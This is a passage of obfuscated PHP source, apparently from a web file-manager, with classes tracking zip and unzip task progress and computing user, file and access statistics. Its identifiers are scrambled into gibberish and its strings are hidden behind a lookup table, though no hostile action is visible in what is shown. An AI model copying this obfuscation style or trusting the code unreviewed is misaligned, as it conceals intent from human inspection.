removeTarget($ÒµŒô, $Ö¹á¿¿) { $æÆòÏ¬ =& $_SERVER[ŒÅŸ‹ä†]; if (!$Ö¹á¿¿) { return !0; } $Ö¹á¿¿ = is_array($Ö¹á¿¿) ? $Ö¹á¿¿ : array($Ö¹á¿¿); $Ñü¬¡˜í = array($æÆòÏ¬[199] => $ÒµŒô, $æÆòÏ¬[594] => array($æÆòÏ¬[7], $Ö¹á¿¿)); $¦ÁëŞç„ = $this->field($æÆòÏ¬[2162])->where($Ñü¬¡˜í)->select(); $àƒ¾Ìêˆ = array_to_keyvalue($¦ÁëŞç„, $æÆòÏ¬[12], $æÆòÏ¬[2162]); return $this->removeArray($àƒ¾Ìêˆ); } public function removeArray($ù®ÈÁ—) { $·¸‹Òå =& $_SERVER[ŒÅŸ‹ä†]; if (!$ù®ÈÁ—) { return !0; } $ù®ÈÁ— = is_array($ù®ÈÁ—) ? $ù®ÈÁ— : array($ù®ÈÁ—); $©úŸÌ¡ = array($·¸‹Òå[2162] => array($·¸‹Òå[7], $ù®ÈÁ—)); Model($·¸‹Òå[2165])->where($©úŸÌ¡)->delete(); Model($·¸‹Òå[2174])->where($©úŸÌ¡)->delete(); return $this->where($©úŸÌ¡)->delete(); } } goto F·µÁÌ‰‚; fì¿¢¥©é: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $²¡û‘±Ì =& $_SERVER[ŒÅŸ‹ä†]; parent::startAfter(); Hook::bind($²¡û‘±Ì[2044], array($this, $²¡û‘±Ì[2045])); Hook::bind($²¡û‘±Ì[1325], array($this, $²¡û‘±Ì[2046])); Hook::bind($²¡û‘±Ì[2047], array($this, $²¡û‘±Ì[2048])); $ñó¢ÛŠØ =& $this->task; $ñó¢ÛŠØ[$²¡û‘±Ì[2049]] = $²¡û‘±Ì[1326]; if (!$ñó¢ÛŠØ[$²¡û‘±Ì[1808]]) { $ñó¢ÛŠØ[$²¡û‘±Ì[1808]] = LNG($²¡û‘±Ì[2050]); } } protected function endAfter() { $’’ª—¡É =& $_SERVER[ŒÅŸ‹ä†]; parent::endAfter(); Hook::unbind($’’ª—¡É[2044], array($this, $’’ª—¡É[2045])); Hook::unbind($’’ª—¡É[1325], array($this, $’’ª—¡É[2046])); Hook::unbind($’’ª—¡É[2047], array($this, $’’ª—¡É[2048])); } public function updateAfter() { $¬“’çÄÈ =& $_SERVER[ŒÅŸ‹ä†]; $š£®á•ˆ =& $this->task; if (!$š£®á•ˆ[$¬“’çÄÈ[1173]] || !$š£®á•ˆ[$¬“’çÄÈ[860]]) { if ($š£®á•ˆ[$¬“’çÄÈ[2049]] != $¬“’çÄÈ[398]) { return; } } if ($š£®á•ˆ[$¬“’çÄÈ[2049]] == $¬“’çÄÈ[1326]) { $ŞÎ²¥óŒ = 0; if ($š£®á•ˆ[$¬“’çÄÈ[1973]]) { $ŞÎ²¥óŒ = $š£®á•ˆ[$¬“’çÄÈ[1974]] / $š£®á•ˆ[$¬“’çÄÈ[1973]]; } $š£®á•ˆ[$¬“’çÄÈ[1921]] = $ŞÎ²¥óŒ * 0.3; } else { if ($š£®á•ˆ[$¬“’çÄÈ[2049]] == $¬“’çÄÈ[398]) { $ŞÎ²¥óŒ = $š£®á•ˆ[$¬“’çÄÈ[1920]] / $š£®á•ˆ[$¬“’çÄÈ[1173]]; $š£®á•ˆ[$¬“’çÄÈ[1921]] = 0.3 + $ŞÎ²¥óŒ * 0.4; } else { if ($š£®á•ˆ[$¬“’çÄÈ[2049]] == $¬“’çÄÈ[118]) { $³ìØÔ…´ = 0; if ($š£®á•ˆ[$¬“’çÄÈ[1975]] == $¬“’çÄÈ[118]) { $³ìØÔ…´ = $š£®á•ˆ[$¬“’çÄÈ[1974]]; } $ŞÎ²¥óŒ = ($š£®á•ˆ[$¬“’çÄÈ[1978]] + $³ìØÔ…´) / $š£®á•ˆ[$¬“’çÄÈ[860]]; $š£®á•ˆ[$¬“’çÄÈ[1921]] = 0.3 + 0.4 + $ŞÎ²¥óŒ * 0.3; } } } if ($š£®á•ˆ[$¬“’çÄÈ[1921]] > 0) { $¤òÛé†Ö = timeFloat() - $š£®á•ˆ[$¬“’çÄÈ[1923]] - $š£®á•ˆ[$¬“’çÄÈ[1926]]; $š£®á•ˆ[$¬“’çÄÈ[1927]] = $¤òÛé†Ö * (1 - $š£®á•ˆ[$¬“’çÄÈ[1921]]) / $š£®á•ˆ[$¬“’çÄÈ[1921]]; } } public function addFile($›í¦øò) { $ƒ†‰‡×É =& $_SERVER[ŒÅŸ‹ä†]; $°À¶©‰å =& $this->task; $ú¿õ©¯· = IO::info($›í¦øò); $°À¶©‰å[$ƒ†‰‡×É[1971]] = $ú¿õ©¯·[$ƒ†‰‡×É[42]]; $°À¶©‰å[$ƒ†‰‡×É[1973]] = $ú¿õ©¯·[$ƒ†‰‡×É[89]]; $°À¶©‰å[$ƒ†‰‡×É[1974]] = 0; $°À¶©‰å[$ƒ†‰‡×É[1175]] = $ƒ†‰‡×É[2002]; $°À¶©‰å[$ƒ†‰‡×É[1975]] = $ƒ†‰‡×É[1326]; $°À¶©‰å[$ƒ†‰‡×É[860]] = $ú¿õ©¯·[$ƒ†‰‡×É[89]]; $°À¶©‰å[$ƒ†‰‡×É[1173]] = 1; $ø™Ã—øÄ = 0; $°À¶©‰å[$ƒ†‰‡×É[1984]] = array($ƒ†‰‡×É[1985] => $ø™Ã—øÄ + 1, $ƒ†‰‡×É[514] => $ú¿õ©¯·[$ƒ†‰‡×É[42]], $ƒ†‰‡×É[97] => $ú¿õ©¯·[$ƒ†‰‡×É[97]], $ƒ†‰‡×É[607] => $ú¿õ©¯·[$ƒ†‰‡×É[607]] ? $ú¿õ©¯·[$ƒ†‰‡×É[607]] : $ú¿õ©¯·[$ƒ†‰‡×É[97]]); $this->update(); } public function zipEvent($°÷·ŸÇ¯, $Ÿ†È…ÄŸ, $µ¯Ñ±Å©, $·Òê×Æø) { $ÏæîöÃç =& $_SERVER[ŒÅŸ‹ä†]; $çÙ€”è­ =& $this->task; $çÙ€”è­[$ÏæîöÃç[1971]] = get_path_this($Ÿ†È…ÄŸ); $çÙ€”è­[$ÏæîöÃç[1973]] = $·Òê×Æø; $çÙ€”è­[$ÏæîöÃç[1974]] = $µ¯Ñ±Å©; $çÙ€”è­[$ÏæîöÃç[1175]] = $°÷·ŸÇ¯ == $ÏæîöÃç[2051] ? $ÏæîöÃç[2052] : $ÏæîöÃç[2053]; $çÙ€”è­[$ÏæîöÃç[1975]] = $ÏæîöÃç[12]; $çÙ€”è­[$ÏæîöÃç[860]] = $·Òê×Æø; $çÙ€”è­[$ÏæîöÃç[2049]] = $ÏæîöÃç[398]; $this->update(); } public function unzipAfter($Ç¯•ŒÑ) { $íÓ…ß =& $_SERVER[ŒÅŸ‹ä†]; $Öû±£° =& $this->task; $Öû±£°[$íÓ…ß[2049]] = $íÓ…ß[118]; $ —õÜÜ = IO::infoWithChildren($Ç¯•ŒÑ); $¥¹³åü¿ = 0; $Öû±£°[$íÓ…ß[1984]] = array($íÓ…ß[1985] => $¥¹³åü¿ + 1, $íÓ…ß[514] => $ —õÜÜ[$íÓ…ß[42]], $íÓ…ß[97] => $ —õÜÜ[$íÓ…ß[97]], $íÓ…ß[607] => $ —õÜÜ[$íÓ…ß[607]] ? $ —õÜÜ[$íÓ…ß[607]] : $ —õÜÜ[$íÓ…ß[97]]); if ($ —õÜÜ[$íÓ…ß[43]] == $íÓ…ß[241]) { $Öû±£°[$íÓ…ß[1173]] = 1; } else { $Öû±£°[$íÓ…ß[1173]] = $ —õÜÜ[$íÓ…ß[92]][$íÓ…ß[90]]; } $Öû±£°[$íÓ…ß[1175]] = $íÓ…ß[12]; $Öû±£°[$íÓ…ß[1975]] = 0; $Öû±£°[$íÓ…ß[1920]] = 0; $Öû±£°[$íÓ…ß[1973]] = 0; $Öû±£°[$íÓ…ß[1974]] = 0; $Öû±£°[$íÓ…ß[1971]] = $íÓ…ß[12]; $Öû±£°[$íÓ…ß[1978]] = 0; $Öû±£°[$íÓ…ß[860]] = $ —õÜÜ[$íÓ…ß[89]]; $this->update(); self::log($íÓ…ß[2054] . json_encode(array($Öû±£°, $ —õÜÜ))); } public function nameParse($½†äıÅ˜) { $õâŒ©˜¸ =& $_SERVER[ŒÅŸ‹ä†]; $¥Æ¢ã”ª =& $this->task; if ($¥Æ¢ã”ª[$õâŒ©˜¸[2049]] == $õâŒ©˜¸[1326]) { $¥Æ¢ã”ª[$õâŒ©˜¸[2049]] = $õâŒ©˜¸[398]; $¥Æ¢ã”ª[$õâŒ©˜¸[1978]] = 0; $¥Æ¢ã”ª[$õâŒ©˜¸[860]] = 0; } $áğóæİ¶ = get_path_this($½†äıÅ˜); if (strstr($áğóæİ¶, $õâŒ©˜¸[10])) { $¥Æ¢ã”ª[$õâŒ©˜¸[1920]] += 1; $¥Æ¢ã”ª[$õâŒ©˜¸[1173]] += 1; } $¥Æ¢ã”ª[$õâŒ©˜¸[1971]] = $½†äıÅ˜; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $å¯•æ†Ô =& $_SERVER[ŒÅŸ‹ä†]; parent::startAfter(); Hook::bind($å¯•æ†Ô[2055], array($this, $å¯•æ†Ô[2045])); Hook::bind($å¯•æ†Ô[2047], array($this, $å¯•æ†Ô[2048])); $ÉäÜæ„¢ =& $this->task; $ÉäÜæ„¢[$å¯•æ†Ô[2049]] = $å¯•æ†Ô[1326]; if (!$ÉäÜæ„¢[$å¯•æ†Ô[1808]]) { $ÉäÜæ„¢[$å¯•æ†Ô[1808]] = LNG($å¯•æ†Ô[2056]); } } protected function endAfter() { $³è¨ÅË” =& $_SERVER[ŒÅŸ‹ä†]; parent::endAfter(); Hook::unbind($³è¨ÅË”[2055], array($this, $³è¨ÅË”[2045])); Hook::unbind($³è¨ÅË”[2047], array($this, $³è¨ÅË”[2048])); } public function updateAfter() { $»ÖÀ¬•Á =& $_SERVER[ŒÅŸ‹ä†]; $†òÀÅ£¹ =& $this->task; if (!$†òÀÅ£¹[$»ÖÀ¬•Á[1173]] || !$†òÀÅ£¹[$»ÖÀ¬•Á[860]]) { return; } if ($†òÀÅ£¹[$»ÖÀ¬•Á[2049]] == $»ÖÀ¬•Á[1326]) { $Ø‚ÕúöÍ = $†òÀÅ£¹[$»ÖÀ¬•Á[1974]]; if ($†òÀÅ£¹[$»ÖÀ¬•Á[1975]] != $»ÖÀ¬•Á[1326]) { $Ø‚ÕúöÍ = 0; } $¥¬×ø¾Û = ($†òÀÅ£¹[$»ÖÀ¬•Á[1978]] + $Ø‚ÕúöÍ) / $†òÀÅ£¹[$»ÖÀ¬•Á[860]]; $†òÀÅ£¹[$»ÖÀ¬•Á[1921]] = $¥¬×ø¾Û * 0.3; } else { if ($†òÀÅ£¹[$»ÖÀ¬•Á[2049]] == $»ÖÀ¬•Á[398]) { $¥¬×ø¾Û = $†òÀÅ£¹[$»ÖÀ¬•Á[1920]] / $†òÀÅ£¹[$»ÖÀ¬•Á[1173]]; $†òÀÅ£¹[$»ÖÀ¬•Á[1921]] = 0.3 + $¥¬×ø¾Û * 0.5; } else { if ($†òÀÅ£¹[$»ÖÀ¬•Á[2049]] == $»ÖÀ¬•Á[118]) { $¥¬×ø¾Û = 0; if ($†òÀÅ£¹[$»ÖÀ¬•Á[1973]]) { $¥¬×ø¾Û = $†òÀÅ£¹[$»ÖÀ¬•Á[1974]] / $†òÀÅ£¹[$»ÖÀ¬•Á[1973]]; } $†òÀÅ£¹[$»ÖÀ¬•Á[1921]] = 0.3 + 0.5 + $¥¬×ø¾Û * 0.2; } } } if ($†òÀÅ£¹[$»ÖÀ¬•Á[1921]] > 0) { $“é¯‡»È = timeFloat() - $†òÀÅ£¹[$»ÖÀ¬•Á[1923]] - $†òÀÅ£¹[$»ÖÀ¬•Á[1926]]; $†òÀÅ£¹[$»ÖÀ¬•Á[1927]] = $“é¯‡»È * (1 - $†òÀÅ£¹[$»ÖÀ¬•Á[1921]]) / $†òÀÅ£¹[$»ÖÀ¬•Á[1921]]; } } public function copyFileStart($ñº…£¢¨, $©•…Ò, $ŒŒÏ¯â¥, $ÒÎ’Ñ¨í, $“Ôî‰å, $ŒîÅõáş) { $øëâÈ =& $_SERVER[ŒÅŸ‹ä†]; parent::copyFileStart($ñº…£¢¨, $©•…Ò, $ŒŒÏ¯â¥, $ÒÎ’Ñ¨í, $“Ôî‰å, $ŒîÅõáş); $°ñÆáÈˆ =& $this->task; if ($°ñÆáÈˆ[$øëâÈ[2049]] == $øëâÈ[398]) { $°ñÆáÈˆ[$øëâÈ[2049]] = $øëâÈ[118]; } $this->update(); } public function copyFileEnd($ğÀÌõ³‹, $óˆ¥áÊù, $´‰—òÄ, $ú¢‰“´©, $Í‚öÄ¤÷, $ÅŸ®ó™) { $ô¬‚àŒì =& $_SERVER[ŒÅŸ‹ä†]; $õ§²Æ£¹ =& $this->task; $õ§²Æ£¹[$ô¬‚àŒì[1974]] = $õ§²Æ£¹[$ô¬‚àŒì[1973]]; $õ§²Æ£¹[$ô¬‚àŒì[1978]] += $õ§²Æ£¹[$ô¬‚àŒì[1973]]; $õ§²Æ£¹[$ô¬‚àŒì[1975]] = $ô¬‚àŒì[12]; $this->update(); } public function zipEvent($×Â÷ñÃ”, $´¿ØİñÁ, $ŸÄ·ŠÚé, $ë§Ì”òÛ) { $¨…îù„ =& $_SERVER[ŒÅŸ‹ä†]; $˜ÑœµÜÛ =& $this->task; $˜ÑœµÜÛ[$¨…îù„[1971]] = get_path_this($´¿ØİñÁ); $˜ÑœµÜÛ[$¨…îù„[1973]] = $ë§Ì”òÛ; $˜ÑœµÜÛ[$¨…îù„[1974]] = $ŸÄ·ŠÚé; $˜ÑœµÜÛ[$¨…îù„[1175]] = $×Â÷ñÃ” == $¨…îù„[2057] ? $¨…îù„[2052] : $¨…îù„[2053]; $˜ÑœµÜÛ[$¨…îù„[1975]] = $¨…îù„[12]; $˜ÑœµÜÛ[$¨…îù„[860]] = $ë§Ì”òÛ; $˜ÑœµÜÛ[$¨…îù„[2049]] = $¨…îù„[398]; $this->update(); } public function nameParse($Ú˜†ŞØß) { $üØã½ © =& $_SERVER[ŒÅŸ‹ä†]; $¯ô„İíØ =& $this->task; if ($¯ô„İíØ[$üØã½ ©[1920]] < $¯ô„İíØ[$üØã½ ©[1173]]) { $æ¥°Ä¯ = get_path_this($Ú˜†ŞØß); if (strstr($æ¥°Ä¯, $üØã½ ©[10])) { $¯ô„İíØ[$üØã½ ©[1920]] += 1; } } if ($¯ô„İíØ[$üØã½ ©[2049]] == $üØã½ ©[1326]) { $¯ô„İíØ[$üØã½ ©[2049]] = $üØã½ ©[398]; } $¯ô„İíØ[$üØã½ ©[1971]] = $Ú˜†ŞØß; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($æÎñİ) { $×‰í½® =& $_SERVER[ŒÅŸ‹ä†]; $Ç­·‰šÒ = array($×‰í½®[690] => array($×‰í½®[43] => $×‰í½®[2058], $×‰í½®[361] => array($×‰í½®[293], $×‰í½®[862], $×‰í½®[2059], $×‰í½®[2060])), $×‰í½®[2061] => array($×‰í½®[43] => $×‰í½®[2062], $×‰í½®[361] => array($×‰í½®[293], $×‰í½®[860], $×‰í½®[2063], $×‰í½®[2064], $×‰í½®[2065]))); if (!isset($Ç­·‰šÒ[$æÎñİ])) { return !1; } $this->optionType = $Ç­·‰šÒ[$æÎñİ][$×‰í½®[43]]; $this->field = $Ç­·‰šÒ[$æÎñİ][$×‰í½®[361]]; return !0; } public function listData($Ì¶Õ¡’³ = false, $ï©è£ = "\x6d\157\x64\151\x66\171\124\151\x6d\x65", $–¹öĞÀú = false) { return parent::listData($Ì¶Õ¡’³, $ï©è£, $–¹öĞÀú); } public function trendList($°ª•­Â) { $ú†­­ñ =& $_SERVER[ŒÅŸ‹ä†]; $”äÛëÚ˜ = $this->listData(); if ($”äÛëÚ˜) { $€‘¬Ñô© = end($”äÛëÚ˜); $ûùå€æ„ = date($ú†­­ñ[2066], strtotime($ú†­­ñ[2067])); if ($€‘¬Ñô©[$ú†­­ñ[293]] == $ûùå€æ„) { return $”äÛëÚ˜; } $¬Ú¨ù¾« = strtotime($€‘¬Ñô©[$ú†­­ñ[293]]); } if (!isset($¬Ú¨ù¾«)) { $»€™‚› = $°ª•­Â == $ú†­­ñ[690] ? $ú†­­ñ[622] : $ú†­­ñ[929]; $¬Ú¨ù¾« = Model($»€™‚›)->min($ú†­­ñ[242]); } $•—ûş¶ = $ú†­­ñ[2068] . ucfirst($°ª•­Â); $Ùœ»ÂÙã = $this->dateList($¬Ú¨ù¾«); foreach ($Ùœ»ÂÙã as $ûùå€æ„) { $this->{$•—ûş¶}($ûùå€æ„); } return $this->listData(); } private function dateList($š­Óîæú) { $‡æÁ‰Í¥ =& $_SERVER[ŒÅŸ‹ä†]; $Åƒò¤Ì = $š­Óîæú; $–ôŒÍâ = strtotime($‡æÁ‰Í¥[2067]); $˜é¼Æª… = array(); while ($Åƒò¤Ì <= $–ôŒÍâ) { $˜é¼Æª…[] = date($‡æÁ‰Í¥[2066], $Åƒò¤Ì); $Åƒò¤Ì = strtotime($‡æÁ‰Í¥[2069], $Åƒò¤Ì); } return $˜é¼Æª…; } public function _recordUser($õ»§­èÙ = '') { $ÈáÆÛÂ =& $_SERVER[ŒÅŸ‹ä†]; $¸ÙÁ¨æõ = strtotime(date($ÈáÆÛÂ[2070], strtotime($õ»§­èÙ))); $ù€Ìøé = strtotime(date($ÈáÆÛÂ[2071], strtotime($õ»§­èÙ))); $ïÅµ¶Ó = array($ÈáÆÛÂ[242] => array($ÈáÆÛÂ[1124], $ù€Ìøé)); $Şıà€í• = Model($ÈáÆÛÂ[622])->where($ïÅµ¶Ó)->count($ÈáÆÛÂ[1537]); $ïÅµ¶Ó[$ÈáÆÛÂ[242]] = array($ÈáÆÛÂ[418], array($¸ÙÁ¨æõ, $ù€Ìøé)); $¶šÖÄÎ = Model($ÈáÆÛÂ[622])->where($ïÅµ¶Ó)->count($ÈáÆÛÂ[1537]); $ïÅµ¶Ó[$ÈáÆÛÂ[43]] = $ÈáÆÛÂ[2072]; $»à”ç¸é = Model($ÈáÆÛÂ[2073])->where($ïÅµ¶Ó)->count($ÈáÆÛÂ[2074]); $›•¢„ĞŠ = array($ÈáÆÛÂ[293] => $õ»§­èÙ, $ÈáÆÛÂ[862] => (int) $Şıà€í•, $ÈáÆÛÂ[2059] => (int) $¶šÖÄÎ, $ÈáÆÛÂ[2060] => (int) $»à”ç¸é); return $this->insert($›•¢„ĞŠ); } public function _recordStore($ÑÑœÑ²µ = '') { $÷ò“›ò¸ =& $_SERVER[ŒÅŸ‹ä†]; $™ÕÜš¨ = strtotime(date($÷ò“›ò¸[2071], strtotime($ÑÑœÑ²µ))); $²¨¢Á† = array($÷ò“›ò¸[242] => array($÷ò“›ò¸[1124], $™ÕÜš¨)); $®Ğ¬ï©š = Model($÷ò“›ò¸[565])->where($²¨¢Á†)->sum($÷ò“›ò¸[89]); $²¨¢Á†[$÷ò“›ò¸[505]] = 0; $…·ÙÓòæ = Model($÷ò“›ò¸[929])->where($²¨¢Á†)->sum($÷ò“›ò¸[89]); $²¨¢Á†[$÷ò“›ò¸[199]] = 1; $Óğã‹¨ = Model($÷ò“›ò¸[929])->where($²¨¢Á†)->sum($÷ò“›ò¸[89]); $²¨¢Á†[$÷ò“›ò¸[199]] = 2; $òø›ÈÒ¯ = Model($÷ò“›ò¸[929])->where($²¨¢Á†)->sum($÷ò“›ò¸[89]); $ƒå¶Ğ° = array($÷ò“›ò¸[293] => $ÑÑœÑ²µ, $÷ò“›ò¸[860] => (int) $…·ÙÓòæ, $÷ò“›ò¸[2063] => (int) $®Ğ¬ï©š, $÷ò“›ò¸[2064] => (int) $Óğã‹¨, $÷ò“›ò¸[2065] => (int) $òø›ÈÒ¯); return $this->insert($ƒå¶Ğ°); } public function trend($ùÄİ‹Áú, $š³Ù½Àà) { $ı”ÊÉ» =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->init($ùÄİ‹Áú)) { return !1; } $°¸éØßÒ = $this->trendList($ùÄİ‹Áú); if ($°¸éØßÒ && $š³Ù½Àà != $ı”ÊÉ»[1893]) { $˜Åó©–‹ = $°¸éØßÒ[0][$ı”ÊÉ»[293]]; $ˆØğ­µ… = $this->validDate($š³Ù½Àà, $˜Åó©–‹); $Ì›‡£é = array(); $ïôÓ¨í = array_to_keyvalue($°¸éØßÒ, $ı”ÊÉ»[293]); foreach ($ˆØğ­µ… as $ãšÂŸ”) { if (isset($ïôÓ¨í[$ãšÂŸ”])) { $½‚ã‘– = $ïôÓ¨í[$ãšÂŸ”]; } else { $½‚ã‘– = end($°¸éØßÒ); $½‚ã‘–[$ı”ÊÉ»[293]] = $ãšÂŸ”; if ($ùÄİ‹Áú == $ı”ÊÉ»[690]) { $½‚ã‘–[$ı”ÊÉ»[2059]] = $½‚ã‘–[$ı”ÊÉ»[2060]] = 0; } } $Ì›‡£é[] = $½‚ã‘–; } $°¸éØßÒ = $Ì›‡£é; } $„ıêû¢» = array($ı”ÊÉ»[690] => array($ı”ÊÉ»[862] => LNG($ı”ÊÉ»[2075]), $ı”ÊÉ»[2059] => LNG($ı”ÊÉ»[2076]), $ı”ÊÉ»[2060] => LNG($ı”ÊÉ»[2077])), $ı”ÊÉ»[2061] => array($ı”ÊÉ»[860] => LNG($ı”ÊÉ»[2078]), $ı”ÊÉ»[2063] => LNG($ı”ÊÉ»[2079]), $ı”ÊÉ»[2064] => LNG($ı”ÊÉ»[2080]), $ı”ÊÉ»[2065] => LNG($ı”ÊÉ»[2081]))); $‚à÷‚ï = array($ı”ÊÉ»[690] => $ı”ÊÉ»[2082], $ı”ÊÉ»[2061] => $ı”ÊÉ»[89]); if (empty($°¸éØßÒ)) { $ãšÂŸ” = date($ı”ÊÉ»[2066], strtotime($ı”ÊÉ»[2067])); $ŸöÀ„«¹ = array($ı”ÊÉ»[293] => $ãšÂŸ”); foreach ($„ıêû¢»[$ùÄİ‹Áú] as $¦ş©÷ëÀ => $•¾êéÜì) { $ŸöÀ„«¹[$¦ş©÷ëÀ] = 0; } $°¸éØßÒ[] = $ŸöÀ„«¹; } $·ñÜá¤ = array(); foreach ($°¸éØßÒ as $•¾êéÜì) { if ($ùÄİ‹Áú == $ı”ÊÉ»[2061] && $•¾êéÜì[$ı”ÊÉ»[2063]] > $•¾êéÜì[$ı”ÊÉ»[860]]) { $•¾êéÜì[$ı”ÊÉ»[2063]] = $•¾êéÜì[$ı”ÊÉ»[860]]; } foreach ($„ıêû¢»[$ùÄİ‹Áú] as $¦ş©÷ëÀ => $–âÑ¼š) { $½‚ã‘– = array($ı”ÊÉ»[293] => $•¾êéÜì[$ı”ÊÉ»[293]], $ı”ÊÉ»[1808] => $–âÑ¼š); $½‚ã‘–[$‚à÷‚ï[$ùÄİ‹Áú]] = isset($•¾êéÜì[$¦ş©÷ëÀ]) ? $•¾êéÜì[$¦ş©÷ëÀ] : 0; $·ñÜá¤[] = $½‚ã‘–; } } return $·ñÜá¤; } public function validDate($É«¨Œ£, $ä›°øã) { $Š®î¤ =& $_SERVER[ŒÅŸ‹ä†]; $•Ë¦â‚ = date($Š®î¤[2066], strtotime($Š®î¤[2067])); $ÉÈÖı«¤ = array($•Ë¦â‚); switch ($É«¨Œ£) { case $Š®î¤[1900]: $±çÑ†ó = mktime(0, 0, 0, date($Š®î¤[2083]), date($Š®î¤[1603]) - date($Š®î¤[1689]) + 7 - 7, date($Š®î¤[2084])); $“§úåïû = 0; do { $•‰—Ìíã = date($Š®î¤[2066], $±çÑ†ó - 3600 * 24 * 7 * $“§úåïû); $ÉÈÖı«¤[] = $•‰—Ìíã; $“§úåïû++; } while ($ä›°øã < $•‰—Ìíã); break; case $Š®î¤[1898]: $“§úåïû = 1; do { $´ÃŒ—ü = date($Š®î¤[2085], strtotime("\x2d\x20{$“§úåïû}\40\x6d\157\x6e\x74\150\163")); $ÉÈÖı«¤[] = $´ÃŒ—ü; $“§úåïû++; } while ($ä›°øã < $´ÃŒ—ü); break; case $Š®î¤[2086]: $£ï¦Şµ° = (int) date($Š®î¤[2084], strtotime($ä›°øã)); $³²Ü˜…Ñ = (int) date($Š®î¤[2084]); if ($£ï¦Şµ° >= $³²Ü˜…Ñ) { break; } for ($£ï¦Şµ°; $£ï¦Şµ° < $³²Ü˜…Ñ; $£ï¦Şµ°++) { $ÉÈÖı«¤[] = $£ï¦Şµ° . $Š®î¤[2087]; } break; default: break; } if ($ä›°øã > end($ÉÈÖı«¤)) { array_pop($ÉÈÖı«¤); } sort($ÉÈÖı«¤); return $ÉÈÖı«¤; } public function listTable($é¹„œø®) { $äú‰Ÿö® = ucfirst($é¹„œø®); return Model($äú‰Ÿö®)->listData(); } public function option($“ÈÜé±ˆ) { return call_user_func_array(array($this, $_SERVER[ŒÅŸ‹ä†][2088] . ucfirst($“ÈÜé±ˆ)), array()); } private function optionUser() { $¿µ³»‰Ø =& $_SERVER[ŒÅŸ‹ä†]; $‘‰“ÙùÕ = Model($¿µ³»‰Ø[622])->count($¿µ³»‰Ø[1537]); $‰ª»…ïÈ = Model($¿µ³»‰Ø[622])->where($¿µ³»‰Ø[2089])->count($¿µ³»‰Ø[1537]); $Ÿş„¼¢û = intval($GLOBALS[$¿µ³»‰Ø[6]][$¿µ³»‰Ø[434]][$¿µ³»‰Ø[1866]]) / 3600; $¼ö÷Â¦í = strtotime("\55{$Ÿş„¼¢û}\40\150\157\x75\x72\163"); $¼üèÔş³ = strtotime(date($¿µ³»‰Ø[2070])); if ($¼ö÷Â¦í < $¼üèÔş³) { $¼ö÷Â¦í = $¼üèÔş³; } $‘‡ØÊ˜ = array($¿µ³»‰Ø[2090] => array($¿µ³»‰Ø[1125], $¼ö÷Â¦í)); $ÚË­ı¶Æ = (int) Model($¿µ³»‰Ø[622])->where($‘‡ØÊ˜)->count($¿µ³»‰Ø[1537]); if (!$ÚË­ı¶Æ) { $ÚË­ı¶Æ = 1; } $‘‡ØÊ˜ = array($¿µ³»‰Ø[2090] => array($¿µ³»‰Ø[1125], $¼üèÔş³)); $—†°ß×Ó = Model($¿µ³»‰Ø[622])->where($‘‡ØÊ˜)->count($¿µ³»‰Ø[1537]); return array($¿µ³»‰Ø[855] => (int) $‘‰“ÙùÕ, $¿µ³»‰Ø[2091] => (int) ($‘‰“ÙùÕ - $‰ª»…ïÈ), $¿µ³»‰Ø[2092] => (int) $‰ª»…ïÈ, $¿µ³»‰Ø[2093] => (int) $—†°ß×Ó, $¿µ³»‰Ø[2094] => $ÚË­ı¶Æ); } private function optionFile() { $ÚœÄ‘¦’ =& $_SERVER[ŒÅŸ‹ä†]; $éÑ˜³Ÿ = $this->sourceSize(); $É‡‰ğÏ = $éÑ˜³Ÿ[$ÚœÄ‘¦’[89]]; $˜ÙÆÓáş = $éÑ˜³Ÿ[$ÚœÄ‘¦’[2063]]; $°ˆæó¦ç = Model($ÚœÄ‘¦’[929])->where(array($ÚœÄ‘¦’[505] => 0))->count($ÚœÄ‘¦’[202]); $¹ÉÀæ× = array($ÚœÄ‘¦’[505] => 0, $ÚœÄ‘¦’[242] => array($ÚœÄ‘¦’[1125], strtotime(date($ÚœÄ‘¦’[2070])))); $æÒåûØã = Model($ÚœÄ‘¦’[929])->where($¹ÉÀæ×)->sum($ÚœÄ‘¦’[89]); $òïà—¯ã = Model($ÚœÄ‘¦’[929])->where($¹ÉÀæ×)->count($ÚœÄ‘¦’[202]); return array($ÚœÄ‘¦’[860] => $É‡‰ğÏ, $ÚœÄ‘¦’[2063] => $˜ÙÆÓáş, $ÚœÄ‘¦’[2095] => $É‡‰ğÏ - $˜ÙÆÓáş, $ÚœÄ‘¦’[2096] => (int) $æÒåûØã, $ÚœÄ‘¦’[862] => (int) $°ˆæó¦ç, $ÚœÄ‘¦’[2097] => (int) $òïà—¯ã); } private function optionAccess() { $˜¸Ã¸ˆ” =& $_SERVER[ŒÅŸ‹ä†]; return array($˜¸Ã¸ˆ”[855] => $this->typeLogCnt(), $˜¸Ã¸ˆ”[118] => $this->typeLogCnt($˜¸Ã¸ˆ”[118]), $˜¸Ã¸ˆ”[544] => $this->typeLogCnt($˜¸Ã¸ˆ”[544]), $˜¸Ã¸ˆ”[1275] => $this->typeLogCnt($˜¸Ã¸ˆ”[1275]), $˜¸Ã¸ˆ”[1506] => $this->typeLogCnt($˜¸Ã¸ˆ”[1506]), $˜¸Ã¸ˆ”[690] => $this->typeLogCnt($˜¸Ã¸ˆ”[12], $˜¸Ã¸ˆ”[2074])); } private function typeLogCnt($÷‰‰óàÓ = '', $¢Œ›ì„® = "\151\144") { $„ÃÇòÅ« =& $_SERVER[ŒÅŸ‹ä†]; $‘‘´ºäá = array($„ÃÇòÅ«[118] => array($„ÃÇòÅ«[2098], $„ÃÇòÅ«[2099]), $„ÃÇòÅ«[544] => array($„ÃÇòÅ«[2100], $„ÃÇòÅ«[2101]), $„ÃÇòÅ«[1275] => array($„ÃÇòÅ«[2102], $„ÃÇòÅ«[2103], $„ÃÇòÅ«[2104]), $„ÃÇòÅ«[1506] => array($„ÃÇòÅ«[2105], $„ÃÇòÅ«[2106]), $„ÃÇòÅ«[1507] => array($„ÃÇòÅ«[2107], $„ÃÇòÅ«[2108], $„ÃÇòÅ«[2109])); $Íş¥ä° = strtotime(date($„ÃÇòÅ«[2070])); $Ş¿’â•ë = array($„ÃÇòÅ«[242] => array($„ÃÇòÅ«[1125], $Íş¥ä°)); if ($÷‰‰óàÓ) { $Ş¿’â•ë[$„ÃÇòÅ«[43]] = array($„ÃÇòÅ«[7], $‘‘´ºäá[$÷‰‰óàÓ]); } $Ê¾³è¡ú = 